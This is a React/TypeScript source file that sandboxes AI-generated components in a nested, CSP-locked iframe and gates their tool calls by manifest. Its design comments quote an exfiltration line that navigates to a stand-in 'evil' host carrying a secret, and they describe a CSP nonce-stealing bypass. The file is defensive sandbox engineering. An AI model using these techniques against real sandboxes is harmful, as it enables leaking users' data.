import { useEffect, useMemo, useRef, useState, type CSSProperties } from "react";
import {
  log,
  type Json,
  type ToolOutcome,
} from "@vendoai/core";
import {
  islandToolFallbackManifest,
  islandVendoActionNames,
  JAIL_PACKAGE_CDN_ORIGIN,
} from "@vendoai/apps/contract";
import { useVendoIntl } from "../../context.js";
import { ContainedNotice } from "../notice.js";
import { FormingSkeleton } from "../forming-skeleton.js";
import { applyFrameResize, FRAME_MAX_HEIGHT_CSS, isFromFrame } from "../frame-resize.js";
import { JAIL_RUNTIME_SOURCE } from "./runtime-bundle.gen.js";

/**
 * The jail is TWO nested frames, and the nesting is the security boundary.
 *
 * CSP's fetch directives close every *subresource* channel out of generated
 * code — `connect-src 'none'` (fetch/XHR/WebSocket/sendBeacon), `img-src data:`
 * (pixel beacons) — and the sandbox (no allow-forms / allow-popups /
 * allow-same-origin) closes form posts, popups, and the parent realm. But a
 * document NAVIGATING ITSELF is governed by none of them: browser-verified,
 * `location.href = "https://evil/?" + secret` from inside a single-frame jail
 * reached the network and returned a real response.
 *
 * The directive that *does* govern a nested context's navigation is the
 * EMBEDDER's `frame-src`. So the generated code runs in an inner frame whose
 * embedder is an outer frame we author, whose `default-src 'none'` makes
 * `frame-src` fall back to `'none'` — blocking the inner frame's navigations
 * (and any frame it spawns) while `about:srcdoc` still loads. The outer frame
 * runs no untrusted code; it is a message relay, so the host's postMessage
 * identity check (source === iframe.contentWindow) still holds end to end.
 *
 * `'unsafe-eval'` is deliberate: evaluation is the jail's job. What the jail
 * forbids is NETWORK — and `script-src` is the only directive that governs the
 * one channel `connect-src` misses, a SCRIPT the realm loads and runs. Its
 * source list is empty by default, so that channel is shut.
 *
 * `loadsPackages` is the PREVIEW VENUE, and it is the only thing that ever puts
 * a network source in this policy: with it, `script-src` gains the one pinned
 * CDN origin plus `data:` (the import map's React shims — inline code, no
 * network, and no more than `'unsafe-eval'` already grants). Without it the
 * policy below names no source at all, which is what a remix fork rendering in
 * a customer's own page gets.
 *
 * `'unsafe-inline'` rather than a nonce, and that is the security property, not
 * a relaxation. A nonce is worthless against code running INSIDE the document
 * that carries it, which is exactly what this document is: CSP blanks a nonce's
 * content attribute but not its IDL property, so
 * `document.querySelector("script").nonce` hands generated code the jail's own
 * nonce, and a `<script src>` it stamps with that nonce is allowed from any
 * origin. Browser-verified against the old `script-src 'nonce-N' 'unsafe-eval'`:
 * the request COMPLETED, foreign code ran here, and the data in its URL left
 * the browser. (A nonce also propagates to modules `import()`ed by the script
 * that carries it, and it makes `'unsafe-inline'` be ignored — so the nonce was
 * costing the source list its authority and buying nothing: the srcdoc is
 * entirely ours, generated source arrives over postMessage rather than in the
 * HTML, so there is no injection here for a nonce to stop, and the realm may
 * already evaluate anything it composes.) With no nonce, the SOURCE LIST
 * governs, and outside the preview venue it is empty. `blob:` stays out of it
 * either way: it is a module transport that reached the loader.
 */
function buildJailSrcdoc(loadsPackages: boolean): string {
  const scriptSources = loadsPackages ? ` ${JAIL_PACKAGE_CDN_ORIGIN} data:` : "";
  const csp = [
    "default-src 'none'",
    `script-src 'unsafe-inline' 'unsafe-eval'${scriptSources}`,
    "style-src 'unsafe-inline'",
    "img-src data:",
    "font-src data:",
    "connect-src 'none'",
  ].join("; ");
  const head = [
    `<meta http-equiv="Content-Security-Policy" content="${csp}">`,
    // An opaque origin is NOT a private one: browser-verified, a subresource
    // request out of this srcdoc otherwise carries the EMBEDDER's URL as its
    // `Referer` under the default policy — which for a console preview is the
    // page naming the project. The CDN is told a package name and a version,
    // and nothing else.
    "<meta name=\"referrer\" content=\"no-referrer\">",
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">",
    "<style>*,*::before,*::after{box-sizing:border-box}html,body{margin:0;padding:0;background:transparent;height:100%}iframe{display:block;width:100%;height:100%;border:0;background:transparent}</style>",
  ].join("");

  // The inner document: the runtime plus the generated code it later renders.
  const safeRuntime = JAIL_RUNTIME_SOURCE.replace(/<\/script/gi, "<\\/script");
  const inner = [
    "<!doctype html><html lang=\"en\"><head>",
    head,
    "<title>Generated Vendo component</title></head><body>",
    `<script>${safeRuntime}<\/script>`,
    "</body></html>",
  ].join("");

  // The outer document: a trusted relay whose policy jails the inner frame's
  // navigations. Escaping `<` keeps the inner HTML from closing this script.
  const relay = `
var inner = document.createElement("iframe");
inner.setAttribute("sandbox", "allow-scripts");
inner.setAttribute("title", "Generated Vendo component");
inner.srcdoc = ${JSON.stringify(inner).replace(/</g, "\\u003C")};
document.body.appendChild(inner);
window.addEventListener("message", function (event) {
  if (event.source === parent) inner.contentWindow.postMessage(event.data, "*");
  else if (event.source === inner.contentWindow) parent.postMessage(event.data, "*");
});
`;
  return [
    "<!doctype html><html lang=\"en\"><head>",
    head,
    "<title>Vendo jail</title></head><body>",
    `<script>${relay}<\/script>`,
    "</body></html>",
  ].join("");
}

export interface JailedComponentProps {
  name: string;
  source: string;
  /** Live tree props, MERGED OVER the furnishing's captured sampleProps: a
   *  node that sets only some props (e.g. a fork's `initialRange`) must not
   *  clobber the baseline's sample seed for the rest — partial props crashed
   *  captured components (remix eval fail class 4). Absent means the
   *  sampleProps rehearsal stub alone wins. */
  props?: Record<string, unknown>;
  furnishing?: JailFurnishing;
  /** Host brand tokens as `--vendo-*` custom properties, applied to the jail root. */
  themeVars?: Record<string, string>;
  /**
   * W4b §2 — the island's compiler-stamped tool manifest: the ONLY tools its
   * ambient `tools` calls may reach. `undefined` means the document predates
   * stamping and the manifest is derived from the source the HOST holds —
   * either way, nothing the iframe claims is ever trusted.
   */
  toolManifest?: readonly string[];
  /** True while the payload is a mid-stream partial: an island crash is a
   *  transient (its source may still be rewritten before ship), so the loud
   *  error note yields to the forming skeleton until the final payload. */
  streaming?: boolean;
  onAction(action: string, payload?: Json): Promise<ToolOutcome>;
  onStateSet(key: string, value: Json): void;
}

export interface JailSubSource {
  source: string;
  imports: Record<string, string>;
}

export interface JailStyle {
  path: string;
  css: string;
}

/** Structural copy of the additive pin-baseline furnishing; ui depends on core only. */
export interface JailFurnishing {
  sourceImports?: Record<string, string>;
  subSources?: Record<string, JailSubSource>;
  sampleProps?: Record<string, unknown>;
  styles?: JailStyle[];
  /**
   * PREVIEW VENUE ONLY, and the whole venue gate: import specifier ->
   * `<name>@<exact version>[/subpath]` the jail may load from
   * `JAIL_PACKAGE_CDN_ORIGIN`, so a captured component importing `recharts`
   * draws instead of being skipped.
   *
   * A preview surface is the only producer. `attachPinFurnishings` (the
   * production path for a remix fork) copies a fixed field list that does not
   * include this one, and `stripServerAuthoritativeFields` deletes it off any
   * stored or imported tree that claims it — so a customer's end users never
   * depend on a CDN's availability and that CDN never sees their traffic.
   */
  packages?: Record<string, string>;
}

const IDENTIFIER_PATTERN = /^[A-Za-z_$][\w$]*$/;

/** A well-formed `tool-call` path: the literal member chain the jail runtime
 *  captured, as identifier segments. Anything else is dropped unanswered. */
const isToolCallPath = (value: unknown): value is string[] =>
  Array.isArray(value)
  && value.length > 0
  && value.every((segment) => typeof segment === "string" && IDENTIFIER_PATTERN.test(segment));

/** Every `$action` name embedded in the props the HOST sends into the jail —
 *  the legacy action channel's own least-privilege set. */
const collectActionNames = (value: unknown, into: Set<string>): void => {
  if (Array.isArray(value)) {
    for (const child of value) collectActionNames(child, into);
    return;
  }
  if (typeof value !== "object" || value === null) return;
  const record = value as Record<string, unknown>;
  if (typeof record.$action === "string") into.add(record.$action);
  for (const child of Object.values(record)) collectActionNames(child, into);
};

/** 08-ui §5 — generated code runs only in this opaque-origin iframe. */
export function JailedComponent({
  name,
  source,
  props,
  furnishing,
  themeVars,
  toolManifest,
  streaming,
  onAction,
  onStateSet,
}: JailedComponentProps) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [error, setError] = useState<string>();
  /** Pinned packages the jail could not fetch. A terminal, factual condition —
   *  never swallowed by `streaming`, which is what turned the last runtime skew
   *  into an eternal skeleton. */
  const [unavailable, setUnavailable] = useState<string[]>();
  const packages = furnishing?.packages;
  const loadsPackages = packages !== undefined && Object.keys(packages).length > 0;
  const srcDoc = useMemo(() => buildJailSrcdoc(loadsPackages), [loadsPackages]);
  // Read from context rather than a prop: every caller already renders inside
  // the provider, and the currency is not a per-island decision.
  const intl = useVendoIntl();
  // The island's tool surface, resolved on the HOST side only. A stamped
  // manifest wins; an unstamped document falls back to scanning the source the
  // host itself holds. The legacy action channel additionally admits the
  // action names the host embedded in the props it sent.
  const manifest = useMemo(
    () => new Set(toolManifest ?? islandToolFallbackManifest(source)),
    [source, toolManifest],
  );
  // Live node props merge OVER the captured sampleProps (never replace them
  // wholesale): a pinned fork whose node carries only `initialRange` still
  // gets the baseline's `valueCents`/`series` seed instead of crashing.
  const effectiveProps = useMemo(
    () => ({ ...furnishing?.sampleProps, ...props }),
    [furnishing, props],
  );
  const allowedActions = useMemo(() => {
    const allowed = new Set(manifest);
    collectActionNames(effectiveProps, allowed);
    // Legacy islands call `props.vendo.action("tool", …)` directly; their
    // literal action names in CODE (never strings/comments — review) are part
    // of the source the host holds, so they stay allowed.
    for (const literal of islandVendoActionNames(source)) allowed.add(literal);
    return allowed;
  }, [effectiveProps, manifest, source]);

  useEffect(() => {
    setError(undefined);
    setUnavailable(undefined);
  }, [furnishing, name, source]);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;
    const sendRender = () => {
      iframe.contentWindow?.postMessage({
        vendo: true,
        kind: "render",
        source,
        props: effectiveProps,
        ...(furnishing?.sourceImports === undefined ? {} : { sourceImports: furnishing.sourceImports }),
        ...(furnishing?.subSources === undefined ? {} : { subSources: furnishing.subSources }),
        ...(furnishing?.styles === undefined ? {} : { styles: furnishing.styles }),
        ...(packages === undefined ? {} : { packages }),
        ...(themeVars === undefined ? {} : { themeVars }),
        intl,
      }, "*");
    };
    const handleMessage = (event: MessageEvent) => {
      if (!isFromFrame(iframe, event)) return;
      const message = event.data as Record<string, unknown> | undefined;
      if (!message) return;

      if (message.kind === "booted") {
        sendRender();
      } else if (message.kind === "state-set" && typeof message.key === "string") {
        onStateSet(message.key, message.value as Json);
      } else if (message.kind === "action" && typeof message.action === "string") {
        const requestId = message.requestId;
        // Never trust the iframe: only action names the host itself put in
        // reach (prop-embedded $action bindings, the stamped tool manifest,
        // literal vendo.action names in the source) may enter the pipe.
        if (!allowedActions.has(message.action)) {
          iframe.contentWindow?.postMessage({
            vendo: true,
            kind: "action-result",
            requestId,
            error: `action "${message.action}" is not available to this island`,
          }, "*");
          return;
        }
        void onAction(message.action, message.payload as Json)
          .then((outcome) => {
            iframe.contentWindow?.postMessage({
              vendo: true,
              kind: "action-result",
              requestId,
              outcome,
            }, "*");
          })
          .catch((actionError: unknown) => {
            iframe.contentWindow?.postMessage({
              vendo: true,
              kind: "action-result",
              requestId,
              error: actionError instanceof Error ? actionError.message : String(actionError),
            }, "*");
          });
      } else if (message.kind === "tool-call" && typeof message.requestId === "string") {
        // W4b §2 — the ambient tools bridge. The literal member chain resolves
        // by underscore-join (tool names never contain dots); a resolved name
        // outside THIS island's manifest is blocked here, before the pipe.
        const requestId = message.requestId;
        if (!isToolCallPath(message.path)) {
          // Answer even a malformed request: a silent drop would leave the
          // island's promise pending forever (review).
          iframe.contentWindow?.postMessage({
            vendo: true,
            kind: "tool-result",
            requestId,
            outcome: { status: "blocked", reason: "malformed tool call" },
          }, "*");
          return;
        }
        const toolName = message.path.join("_");
        if (!manifest.has(toolName)) {
          iframe.contentWindow?.postMessage({
            vendo: true,
            kind: "tool-result",
            requestId,
            outcome: {
              status: "blocked",
              reason: `tool "${toolName}" is not in this island's tool manifest`,
            },
          }, "*");
          return;
        }
        void onAction(toolName, message.args as Json)
          .then((outcome) => {
            iframe.contentWindow?.postMessage({
              vendo: true,
              kind: "tool-result",
              requestId,
              outcome,
            }, "*");
          })
          .catch((toolError: unknown) => {
            iframe.contentWindow?.postMessage({
              vendo: true,
              kind: "tool-result",
              requestId,
              error: toolError instanceof Error ? toolError.message : String(toolError),
            }, "*");
          });
      } else if (message.kind === "packages-unavailable" && Array.isArray(message.packages)) {
        setUnavailable(message.packages.filter((value): value is string => typeof value === "string"));
      } else if (message.kind === "error") {
        setError(typeof message.message === "string" ? message.message : "generated component failed");
      } else if (message.kind === "empty") {
        setError("generated component rendered no content");
      } else {
        // The frame resize protocol, shared with the served app's http frame.
        applyFrameResize(iframe, event);
      }
    };

    window.addEventListener("message", handleMessage);
    iframe.addEventListener("load", sendRender);
    sendRender();
    return () => {
      window.removeEventListener("message", handleMessage);
      iframe.removeEventListener("load", sendRender);
    };
  }, [allowedActions, effectiveProps, furnishing, intl, manifest, onAction, onStateSet, packages, source, themeVars]);

  // A package that will not load is not a transient: the CDN is down, the
  // version is gone, or the package was never public. Say so at every stage of
  // the stream — a preview renders `streaming` forever, so deferring this note
  // would leave the same never-resolving shimmer it exists to replace.
  if (unavailable !== undefined && unavailable.length > 0) {
    return (
      <ContainedNotice label="Preview unavailable">
        {`${name}: could not load ${unavailable.join(", ")}`}
      </ContainedNotice>
    );
  }

  if (error) {
    // Mid-stream, a crash is not a verdict: the island's source may still be
    // rewritten (or restructured to use the host registry properly) before the
    // final payload ships. Hold the silhouette; the note is for final payloads.
    if (streaming === true) {
      // But NEVER swallow it entirely. A surface that renders previews with
      // `streaming` permanently (no stream to finish) turns every crash into a
      // shimmer skeleton that is indistinguishable from "still loading" — a
      // real captured component failed this way on a stale jail runtime and
      // took a browser investigation to find, because nothing anywhere said so.
      log({
        code: "ui.jailed-component-mid-stream-error",
        level: "warn",
        message: `[vendo] "${name}" failed inside the jail and is showing a loading silhouette because the payload is mid-stream: ${error}`,
      });
      return <FormingSkeleton name={name} />;
    }
    return <ContainedNotice label="Generated component error">{`${name}: ${error}`}</ContainedNotice>;
  }

  const style: CSSProperties = {
    width: "100%",
    minHeight: "var(--vendo-jail-min-height, 16px)",
    // The host's ceiling. Taller generated content scrolls inside this frame
    // instead of pushing the host's layout (06-apps §9 — the host's bounds win).
    maxHeight: FRAME_MAX_HEIGHT_CSS,
    border: 0,
    background: "transparent",
  };
  return (
    <iframe
      ref={iframeRef}
      title={`Generated component: ${name}`}
      sandbox="allow-scripts"
      srcDoc={srcDoc}
      style={style}
    />
  );
}
